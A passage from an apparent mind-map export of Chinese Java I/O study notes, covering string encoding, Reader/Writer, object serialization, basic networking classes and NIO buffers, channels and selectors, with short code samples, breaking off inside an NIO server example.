  <head>
    
  </head>
  <body>
    <p>
      String 的编码方式
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: String 的编码方式" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#string-的编码方式">
</a>
    <p dir="auto">
      String 可以看成一个字符序列，可以指定一个编码方式将它编码为字节序列，也可以指定一个编码方式将一个字节序列解码为 String。
    </p>
    <pre>String str1 = &quot;中文&quot;;
byte[] bytes = str1.getBytes(&quot;UTF-8&quot;);
String str2 = new String(bytes, &quot;UTF-8&quot;);
System.out.println(str2);</pre>
    <p dir="auto">
      在调用无参数 getBytes() 方法时，默认的编码方式不是 UTF-16be。双字节编码的好处是可以使用一个 char 存储中文和英文，而将 String 转为 bytes[] 字节数组就不再需要这个好处，因此也就不再需要双字节编码。getBytes() 的默认编码方式与平台有关，一般为 UTF-8。
    </p>
    <pre>byte[] bytes = str1.getBytes();</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_660112806" CREATED="1754750650800" MODIFIED="1754750650801"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Reader 与 Writer
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Reader 与 Writer" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#reader-与-writer">
</a>
    <p dir="auto">
      不管是磁盘还是网络传输，最小的存储单元都是字节，而不是字符。但是在程序中操作的通常是字符形式的数据，因此需要提供对字符进行操作的方法。
    </p>
    <ul dir="auto">
      <li>
        InputStreamReader 实现从字节流解码成字符流；
      </li>
      <li>
        OutputStreamWriter 实现字符流编码成为字节流。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_500778420" CREATED="1754750650802" MODIFIED="1754750650803"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      实现逐行输出文本文件的内容
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 实现逐行输出文本文件的内容" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#实现逐行输出文本文件的内容">
</a>
    <pre>public static void readFileContent(String filePath) throws IOException {
    FileReader fileReader = new FileReader(filePath);
    BufferedReader bufferedReader = new BufferedReader(fileReader);
    String line;
    while ((line = bufferedReader.readLine()) != null) {
        System.out.println(line);
    }
    // 装饰者模式使得 BufferedReader 组合了一个 Reader 对象
    // 在调用 BufferedReader 的 close() 方法时会去调用 Reader 的 close() 方法
    // 因此只要一个 close() 调用即可
    bufferedReader.close();
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_454064025" CREATED="1754750650804" MODIFIED="1754750650804"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      五、对象操作
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_577796538" CREATED="1754750650805" MODIFIED="1754750650806"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      序列化
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 序列化" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#序列化">
</a>
    <p dir="auto">
      序列化就是将一个对象转换成字节序列，方便存储和传输。
    </p>
    <ul dir="auto">
      <li>
        序列化：ObjectOutputStream.writeObject()
      </li>
      <li>
        反序列化：ObjectInputStream.readObject()
      </li>
    </ul>
    <p dir="auto">
      不会对静态变量进行序列化，因为序列化只是保存对象的状态，静态变量属于类的状态。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1014824307" CREATED="1754750650807" MODIFIED="1754750650809"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Serializable
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Serializable" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#serializable">
</a>
    <p dir="auto">
      序列化的类需要实现 Serializable 接口，它只是一个标准，没有任何方法需要实现，但是如果不去实现它的话而进行序列化，会抛出异常。
    </p>
    <pre>public static void main(String[] args) throws IOException, ClassNotFoundException {
    A a1 = new A(123, &quot;abc&quot;);
    String objectFile = &quot;file/a1&quot;;
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(objectFile));
    objectOutputStream.writeObject(a1);
    objectOutputStream.close();
    ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(objectFile));
    A a2 = (A) objectInputStream.readObject();
    objectInputStream.close();
    System.out.println(a2);
}
private static class A implements Serializable {
    private int x;
    private String y;
    A(int x, String y) {
        this.x = x;
        this.y = y;
    }
    @Override
    public String toString() {
        return &quot;x = &quot; + x + &quot;  &quot; + &quot;y = &quot; + y;
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_999930948" CREATED="1754750650809" MODIFIED="1754750650810"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      transient
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: transient" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#transient">
</a>
    <p dir="auto">
      transient 关键字可以使一些属性不会被序列化。
    </p>
    <p dir="auto">
      ArrayList 中存储数据的数组 elementData 是用 transient 修饰的，因为这个数组是动态扩展的，并不是所有的空间都被使用，因此就不需要所有的内容都被序列化。通过重写序列化和反序列化方法，使得可以只序列化数组中有内容的那部分数据。
    </p>
    <pre>private transient Object[] elementData;</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_21069542" CREATED="1754750650811" MODIFIED="1754750650812"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      六、网络操作
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 六、网络操作" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#六网络操作">
</a>
    <p dir="auto">
      Java 中的网络支持：
    </p>
    <ul dir="auto">
      <li>
        InetAddress：用于表示网络上的硬件资源，即 IP 地址；
      </li>
      <li>
        URL：统一资源定位符；
      </li>
      <li>
        Sockets：使用 TCP 协议实现网络通信；
      </li>
      <li>
        Datagram：使用 UDP 协议实现网络通信。
      </li>
    </ul>
  </body>
</html></richcontent>
<node ID="ID_1342909844" CREATED="1754750650813" MODIFIED="1754750650815"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      InetAddress
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: InetAddress" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#inetaddress">
</a>
    <p dir="auto">
      没有公有的构造函数，只能通过静态方法来创建实例。
    </p>
    <pre>InetAddress.getByName(String host);
InetAddress.getByAddress(byte[] address);</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1392107975" CREATED="1754750650815" MODIFIED="1754750650816"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      URL
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: URL" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#url">
</a>
    <p dir="auto">
      可以直接从 URL 中读取字节流数据。
    </p>
    <pre>public static void main(String[] args) throws IOException {
    URL url = new URL(&quot;http://www.baidu.com&quot;);
    /* 字节流 */
    InputStream is = url.openStream();
    /* 字符流 */
    InputStreamReader isr = new InputStreamReader(is, &quot;utf-8&quot;);
    /* 提供缓存功能 */
    BufferedReader br = new BufferedReader(isr);
    String line;
    while ((line = br.readLine()) != null) {
        System.out.println(line);
    }
    br.close();
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_407180741" CREATED="1754750650817" MODIFIED="1754750650818"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Sockets
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Sockets" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#sockets">
</a>
    <ul dir="auto">
      <li>
        ServerSocket：服务器端类
      </li>
      <li>
        Socket：客户端类
      </li>
      <li>
        服务器和客户端通过 InputStream 和 OutputStream 进行输入输出。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d8a8eecec95bb03209eac14383e3afa73e7b23d4bbe690be723fb0ad912249f9/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31653661666663342d313865352d343539362d393665662d6662383463363362663838612e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/d8a8eecec95bb03209eac14383e3afa73e7b23d4bbe690be723fb0ad912249f9/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31653661666663342d313865352d343539362d393665662d6662383463363362663838612e706e67" width="550px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1e6affc4-18e5-4596-96ef-fb84c63bf88a.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1314311334" CREATED="1754750650819" MODIFIED="1754750650820"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Datagram
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Datagram" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#datagram">
</a>
    <ul dir="auto">
      <li>
        DatagramSocket：通信类
      </li>
      <li>
        DatagramPacket：数据包类
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1865496472" CREATED="1754750650821" MODIFIED="1754750650822"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      七、NIO
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 七、NIO" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#七nio">
</a>
    <p dir="auto">
      新的输入/输出 (NIO) 库是在 JDK 1.4 中引入的，弥补了原来的 I/O 的不足，提供了高速的、面向块的 I/O。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1981092213" CREATED="1754750650823" MODIFIED="1754750650825"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      流与块
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 流与块" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#流与块">
</a>
    <p dir="auto">
      I/O 与 NIO 最重要的区别是数据打包和传输的方式，I/O 以流的方式处理数据，而 NIO 以块的方式处理数据。
    </p>
    <p dir="auto">
      面向流的 I/O 一次处理一个字节数据：一个输入流产生一个字节数据，一个输出流消费一个字节数据。为流式数据创建过滤器非常容易，链接几个过滤器，以便每个过滤器只负责复杂处理机制的一部分。不利的一面是，面向流的 I/O 通常相当慢。
    </p>
    <p dir="auto">
      面向块的 I/O 一次处理一个数据块，按块处理数据比按流处理数据要快得多。但是面向块的 I/O 缺少一些面向流的 I/O 所具有的优雅性和简单性。
    </p>
    <p dir="auto">
      I/O 包和 NIO 已经很好地集成了，java.io.* 已经以 NIO 为基础重新实现了，所以现在它可以利用 NIO 的一些特性。例如，java.io.* 包中的一些类包含以块的形式读写数据的方法，这使得即使在面向流的系统中，处理速度也会更快。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1711670544" CREATED="1754750650825" MODIFIED="1754750650825"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      通道与缓冲区
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_249086926" CREATED="1754750650827" MODIFIED="1754750650828"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 通道
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 通道" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#1-通道">
</a>
    <p dir="auto">
      通道 Channel 是对原 I/O 包中的流的模拟，可以通过它读取和写入数据。
    </p>
    <p dir="auto">
      通道与流的不同之处在于，流只能在一个方向上移动(一个流必须是 InputStream 或者 OutputStream 的子类)，而通道是双向的，可以用于读、写或者同时用于读写。
    </p>
    <p dir="auto">
      通道包括以下类型：
    </p>
    <ul dir="auto">
      <li>
        FileChannel：从文件中读写数据；
      </li>
      <li>
        DatagramChannel：通过 UDP 读写网络中数据；
      </li>
      <li>
        SocketChannel：通过 TCP 读写网络中数据；
      </li>
      <li>
        ServerSocketChannel：可以监听新进来的 TCP 连接，对每一个新进来的连接都会创建一个 SocketChannel。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1770199714" CREATED="1754750650829" MODIFIED="1754750650831"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 缓冲区
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 缓冲区" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#2-缓冲区">
</a>
    <p dir="auto">
      发送给一个通道的所有数据都必须首先放到缓冲区中，同样地，从通道中读取的任何数据都要先读到缓冲区中。也就是说，不会直接对通道进行读写数据，而是要先经过缓冲区。
    </p>
    <p dir="auto">
      缓冲区实质上是一个数组，但它不仅仅是一个数组。缓冲区提供了对数据的结构化访问，而且还可以跟踪系统的读/写进程。
    </p>
    <p dir="auto">
      缓冲区包括以下类型：
    </p>
    <ul dir="auto">
      <li>
        ByteBuffer
      </li>
      <li>
        CharBuffer
      </li>
      <li>
        ShortBuffer
      </li>
      <li>
        IntBuffer
      </li>
      <li>
        LongBuffer
      </li>
      <li>
        FloatBuffer
      </li>
      <li>
        DoubleBuffer
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1728995639" CREATED="1754750650832" MODIFIED="1754750650833"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      缓冲区状态变量
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 缓冲区状态变量" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#缓冲区状态变量">
</a>
    <ul dir="auto">
      <li>
        capacity：最大容量；
      </li>
      <li>
        position：当前已经读写的字节数；
      </li>
      <li>
        limit：还可以读写的字节数。
      </li>
    </ul>
    <p dir="auto">
      状态变量的改变过程举例：
    </p>
    <p dir="auto">
      ① 新建一个大小为 8 个字节的缓冲区，此时 position 为 0，而 limit = capacity = 8。capacity 变量不会改变，下面的讨论会忽略它。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f761c74ea75c4d278250682ccbff5436e896ba11679cf0eab3bd18feb60b2b2f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31626561333938662d313761372d346636372d613930622d3965326432343365616139612e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/f761c74ea75c4d278250682ccbff5436e896ba11679cf0eab3bd18feb60b2b2f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31626561333938662d313761372d346636372d613930622d3965326432343365616139612e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1bea398f-17a7-4f67-a90b-9e2d243eaa9a.png"/>
    </a><br/>
    

    <p dir="auto">
      ② 从输入通道中读取 5 个字节数据写入缓冲区中，此时 position 为 5，limit 保持不变。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ea4a442f6a0439c0271418f100a3d7818ccbefedbdf0ab6daf7017714a23d06f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38303830346635322d383831352d343039362d623530362d3438656566336565643563362e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/ea4a442f6a0439c0271418f100a3d7818ccbefedbdf0ab6daf7017714a23d06f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38303830346635322d383831352d343039362d623530362d3438656566336565643563362e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/80804f52-8815-4096-b506-48eef3eed5c6.png"/>
    </a><br/>
    

    <p dir="auto">
      ③ 在将缓冲区的数据写到输出通道之前，需要先调用 flip() 方法，这个方法将 limit 设置为当前 position，并将 position 设置为 0。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/0797d8fd0029bac57196b201e9a5f8dc71a0335a2cbaca97d96a14aa116db95a/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39353265303662642d356136352d346361622d383265342d6464313533363436326633382e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/0797d8fd0029bac57196b201e9a5f8dc71a0335a2cbaca97d96a14aa116db95a/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39353265303662642d356136352d346361622d383265342d6464313533363436326633382e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/952e06bd-5a65-4cab-82e4-dd1536462f38.png"/>
    </a><br/>
    

    <p dir="auto">
      ④ 从缓冲区中取 4 个字节到输出缓冲中，此时 position 设为 4。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/05d6b646609da30265a2751cac542632180601afc23d5bd849286356dbcd5409/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62356264636265322d623935382d346165662d393135312d3661643936336362323862342e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/05d6b646609da30265a2751cac542632180601afc23d5bd849286356dbcd5409/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62356264636265322d623935382d346165662d393135312d3661643936336362323862342e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/b5bdcbe2-b958-4aef-9151-6ad963cb28b4.png"/>
    </a><br/>
    

    <p dir="auto">
      ⑤ 最后需要调用 clear() 方法来清空缓冲区，此时 position 和 limit 都被设置为最初位置。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/7922bad2be6ec36751261eebd301d9ef67b4b05e4f6ebb582dde6bde828db6b5/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36376266353438372d633435642d343962362d623963302d6130353864386336383930322e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/7922bad2be6ec36751261eebd301d9ef67b4b05e4f6ebb582dde6bde828db6b5/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36376266353438372d633435642d343962362d623963302d6130353864386336383930322e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/67bf5487-c45d-49b6-b9c0-a058d8c68902.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_884843502" CREATED="1754750650833" MODIFIED="1754750650834"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      文件 NIO 实例
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 文件 NIO 实例" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#文件-nio-实例">
</a>
    <p dir="auto">
      以下展示了使用 NIO 快速复制文件的实例：
    </p>
    <pre>public static void fastCopy(String src, String dist) throws IOException {
    /* 获得源文件的输入字节流 */
    FileInputStream fin = new FileInputStream(src);
    /* 获取输入字节流的文件通道 */
    FileChannel fcin = fin.getChannel();
    /* 获取目标文件的输出字节流 */
    FileOutputStream fout = new FileOutputStream(dist);
    /* 获取输出字节流的文件通道 */
    FileChannel fcout = fout.getChannel();
    /* 为缓冲区分配 1024 个字节 */
    ByteBuffer buffer = ByteBuffer.allocateDirect(1024);
    while (true) {
        /* 从输入通道中读取数据到缓冲区中 */
        int r = fcin.read(buffer);
        /* read() 返回 -1 表示 EOF */
        if (r == -1) {
            break;
        }
        /* 切换读写 */
        buffer.flip();
        /* 把缓冲区的内容写入输出文件中 */
        fcout.write(buffer);
        /* 清空缓冲区 */
        buffer.clear();
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_359441704" CREATED="1754750650835" MODIFIED="1754750650836"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      选择器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 选择器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#选择器">
</a>
    <p dir="auto">
      NIO 常常被叫做非阻塞 IO，主要是因为 NIO 在网络通信中的非阻塞特性被广泛使用。
    </p>
    <p dir="auto">
      NIO 实现了 IO 多路复用中的 Reactor 模型，一个线程 Thread 使用一个选择器 Selector 通过轮询的方式去监听多个通道 Channel 上的事件，从而让一个线程就可以处理多个事件。
    </p>
    <p dir="auto">
      通过配置监听的通道 Channel 为非阻塞，那么当 Channel 上的 IO 事件还未到达时，就不会进入阻塞状态一直等待，而是继续轮询其它 Channel，找到 IO 事件已经到达的 Channel 执行。
    </p>
    <p dir="auto">
      因为创建和切换线程的开销很大，因此使用一个线程来处理多个事件而不是一个线程处理一个事件，对于 IO 密集型的应用具有很好地性能。
    </p>
    <p dir="auto">
      应该注意的是，只有套接字 Channel 才能配置为非阻塞，而 FileChannel 不能，为 FileChannel 配置非阻塞也没有意义。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/556b86c77d2690ee41116d9e080e0771e8426ae943f5fe5b67da8e04950d4a98/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30393366396535372d343239632d343133612d383365652d6336383962613539366365662e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/556b86c77d2690ee41116d9e080e0771e8426ae943f5fe5b67da8e04950d4a98/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30393366396535372d343239632d343133612d383365652d6336383962613539366365662e706e67" width="350px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/093f9e57-429c-413a-83ee-c689ba596cef.png"/>
    </a><br/>
  </body>
</html></richcontent>
<node ID="ID_297994271" CREATED="1754750650837" MODIFIED="1754750650839"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 创建选择器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 创建选择器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#1-创建选择器">
</a>
    <pre>Selector selector = Selector.open();</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_386076535" CREATED="1754750650839" MODIFIED="1754750650841"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 将通道注册到选择器上
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 将通道注册到选择器上" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#2-将通道注册到选择器上">
</a>
    <pre>ServerSocketChannel ssChannel = ServerSocketChannel.open();
ssChannel.configureBlocking(false);
ssChannel.register(selector, SelectionKey.OP_ACCEPT);</pre>
    <p dir="auto">
      通道必须配置为非阻塞模式，否则使用选择器就没有任何意义了，因为如果通道在某个事件上被阻塞，那么服务器就不能响应其它事件，必须等待这个事件处理完毕才能去处理其它事件，显然这和选择器的作用背道而驰。
    </p>
    <p dir="auto">
      在将通道注册到选择器上时，还需要指定要注册的具体事件，主要有以下几类：
    </p>
    <ul dir="auto">
      <li>
        SelectionKey.OP_CONNECT
      </li>
      <li>
        SelectionKey.OP_ACCEPT
      </li>
      <li>
        SelectionKey.OP_READ
      </li>
      <li>
        SelectionKey.OP_WRITE
      </li>
    </ul>
    <p dir="auto">
      它们在 SelectionKey 的定义如下：
    </p>
    <pre>public static final int OP_READ = 1 &lt;&lt; 0;
public static final int OP_WRITE = 1 &lt;&lt; 2;
public static final int OP_CONNECT = 1 &lt;&lt; 3;
public static final int OP_ACCEPT = 1 &lt;&lt; 4;</pre>
    <p dir="auto">
      可以看出每个事件可以被当成一个位域，从而组成事件集整数。例如：
    </p>
    <pre>int interestSet = SelectionKey.OP_READ | SelectionKey.OP_WRITE;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_471546907" CREATED="1754750650841" MODIFIED="1754750650843"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 监听事件
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 监听事件" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#3-监听事件">
</a>
    <pre>int num = selector.select();</pre>
    <p dir="auto">
      使用 select() 来监听到达的事件，它会一直阻塞直到有至少一个事件到达。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1332015408" CREATED="1754750650843" MODIFIED="1754750650845"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 获取到达的事件
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 获取到达的事件" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#4-获取到达的事件">
</a>
    <pre>Set&lt;SelectionKey&gt; keys = selector.selectedKeys();
Iterator&lt;SelectionKey&gt; keyIterator = keys.iterator();
while (keyIterator.hasNext()) {
    SelectionKey key = keyIterator.next();
    if (key.isAcceptable()) {
        // ...
    } else if (key.isReadable()) {
        // ...
    }
    keyIterator.remove();
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_506488286" CREATED="1754750650845" MODIFIED="1754750650847"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 事件循环
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 5. 事件循环" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#5-事件循环">
</a>
    <p dir="auto">
      因为一次 select() 调用不能处理完所有的事件，并且服务器端有可能需要一直监听事件，因此服务器端处理事件的代码一般会放在一个死循环内。
    </p>
    <pre>while (true) {
    int num = selector.select();
    Set&lt;SelectionKey&gt; keys = selector.selectedKeys();
    Iterator&lt;SelectionKey&gt; keyIterator = keys.iterator();
    while (keyIterator.hasNext()) {
        SelectionKey key = keyIterator.next();
        if (key.isAcceptable()) {
            // ...
        } else if (key.isReadable()) {
            // ...
        }
        keyIterator.remove();
    }
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1941465786" CREATED="1754750650847" MODIFIED="1754750650849"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      套接字 NIO 实例
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 套接字 NIO 实例" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#套接字-nio-实例">
</a>
    <pre>public class NIOServer {
    public static void main(String[] args) throws IOException {
        Selector selector = Selector.open();
        ServerSocketChannel ssChannel = ServerSocketChannel.open();
        ssChannel.configureBlocking(false);
        ssChannel.register(selector, SelectionKey.OP_ACCEPT);
        ServerSocket serverSocket = ssChannel.socket();
        InetSocketAddress address = new InetSocketAddress(&quot;127.0.0.1&quot;, 8888);
        serverSocket.bind(address);
        while (true) {
            selector.select();
            Set&lt;SelectionKey&gt; keys = selector.selectedKeys();
            Iterator&lt;SelectionKey&gt; keyIterator = keys.iterator();
            while (keyIterator.hasNext()) {
                SelectionKey key = keyIterator.next();
                if (key.isAcceptable()) {
